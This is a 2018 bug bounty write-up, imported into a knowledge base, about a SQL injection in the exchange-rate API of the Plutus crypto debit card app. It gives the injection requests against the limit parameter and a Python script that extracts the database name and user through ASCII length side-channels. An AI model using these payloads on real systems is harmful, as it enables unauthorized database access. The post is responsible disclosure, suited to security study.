---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-09-11_hacking-a-crypto-debit-card-service.md
original_filename: 2018-09-11_hacking-a-crypto-debit-card-service.md
title: Hacking a Crypto Debit Card Service
category: documents
detected_topics:
- idor
- access-control
- sqli
- command-injection
- otp
- mobile-security
tags:
- imported
- documents
- idor
- access-control
- sqli
- command-injection
- otp
- mobile-security
language: en
raw_sha256: 7c2e87089e207caf8b60b0b3f9bb7971989f0e1dbab45b68e0f90461fe14ba09
text_sha256: 226d65928b78022743b950008f4e9ff7bbe9e22946c39f7ba74bf745da15cca7
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Hacking a Crypto Debit Card Service

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-09-11_hacking-a-crypto-debit-card-service.md
- Source Type: markdown
- Detected Topics: idor, access-control, sqli, command-injection, otp, mobile-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `7c2e87089e207caf8b60b0b3f9bb7971989f0e1dbab45b68e0f90461fe14ba09`
- Text SHA256: `226d65928b78022743b950008f4e9ff7bbe9e22946c39f7ba74bf745da15cca7`


## Content

---
title: "Hacking a Crypto Debit Card Service"
url: "https://medium.com/@mahitman1/hacking-a-crypto-debit-card-service-730f287aaee7"
authors: ["Muhammad Abdullah"]
programs: ["Plutus"]
bugs: ["SQL injection"]
publication_date: "2018-09-11"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5705
scraped_via: "browseros"
---

# Hacking a Crypto Debit Card Service

Hacking a Crypto Debit Card Service
Muhammad Abdullah
Follow
3 min read
·
Sep 11, 2018

65

Background:

Plutus is working on the motto “Spend Crypto, Anywhere,” It is working on worldwide payments solution to make it easier for cryptocurrency users to spend money with merchants.

So this goes back to March 2018 when I found Plutus. I loved the project and signed-up for it. As an ethical Hacker I always look at the security side of the project/site to whom I sign up. Turns out I found some serious issues. I reported them multiple high severity issues via support channel for which they rewarded me. This vulnerability is also one of them. After some time they launched a Public Bug bounty Program which shows their seriousness towards security (not like Blockchain projects who run ICO and then vanishes).

Vulnerability:

The vulnerability I found was SQL Injection. SQL injection is a Jackpot while hunting a program. For those who don’t know SQL Injection. SQL injection is a code injection technique, used to attack data-driven applications, in which nefarious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker).

Testing:

While testing any project/program, testing the APIs is one of the important things one should do. APIs are often vulnerable to IDORs and other serious issue. So in this case I got SQL.

While testing the mobile application of Plutus, An API call was made which was fetching the exchange_rates. The request was as follows

https://api.plutus.it/mobile/v1/exchange_rates?crypto_currency=PLU&limit=1

In the above “limit” parameter was actually the length of JSON list being returned.

So when I added “+-“ to this limit parameter I got the following response.

https://api.plutus.it/mobile/v1/exchange_rates?crypto_currency=PLU&limit=1+-

Response:

{“errors”:{“name”:”SequelizeDatabaseError”,”message”:”syntax error at or near \”;\””}}

So this gave me a hint that something is seriously wrong here and a SQL Injection is in action. So I requested the following.

https://api.plutus.it/mobile/v1/exchange_rates?crypto_currency=PLU&limit=(SELECT+current_user)

But the response I got was

{“errors”:{“name”:”SequelizeDatabaseError”,”message”:”argument of LIMIT must be type bigint, not type name”}}

As the output of limit parameter is of BIGINT type hence name type wasn’t returning.

Exploitation:

In order to exploit the scenario, I had to do the following.

Since only BIGINT was returning so I had to cast each letter of “current_user” name to ASCII which would return a BIGINT. Limit parameter was actually the length of JSON list being returned.

So the following the steps which I had to perform.

1. First I calculated the length of the “current_user” name.

2. Then extract the each character of the ”current_user” using SUBSTR. The length of JSON output was actually the ASCII value of the letter.

3. Convert ASCII values to text.

Get Muhammad Abdullah’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

So for this I wrote a small python script to automate the process.

import requests

print(“#SQL INJECTION POC FOR api.plutus.it BY MUHAMMAD ABDULLAH”)

print(“This script will only get the current_user and current_db”)

response=requests.get(‘https://api.plutus.it/mobile/v1/exchange_rates?crypto_currency=PLU&limit='+'(SELECT+length((SELECT+current_database())))', headers={‘Authorization’:’Bearer tokenxyzhere’})

size=len(response.json())

database=[]

user=[]

for i in range(size+1):

r=requests.get(‘https://api.plutus.it/mobile/v1/exchange_rates?crypto_currency=PLU&limit='+'(SELECT+ascii(SUBSTR((SELECT+current_database()),'+str(i)+',1)))', headers={‘Authorization’:’Bearer tokenxyzhere’})

u=requests.get(‘https://api.plutus.it/mobile/v1/exchange_rates?crypto_currency=PLU&limit='+'(SELECT+ascii(SUBSTR((SELECT+current_user),'+str(i)+',1)))', headers={‘Authorization’:’Bearer tokenxyzhere’})

database.append(len(r.json()))

user.append(len(r.json()))

database=’’.join(chr(i) for i in database)

username=’’.join(chr(i) for i in user)

print(“current_database”)

print(“**************”)

print(database)

print(“**************”)

print(“”)

print(“”)

print(“current_user”)

print(“**************”)

print(username)

print(“**************”)

I stopped by just extracting current_user and current_db as it was sufficient to show the vulnerability.

TakeAways:

~Don’t miss the mobile applications

~Always test the APIs

TimeLine:

April 15 ,2018 -> Report sent
April 20 ,2018 -> Bug Fixed and Rewarded
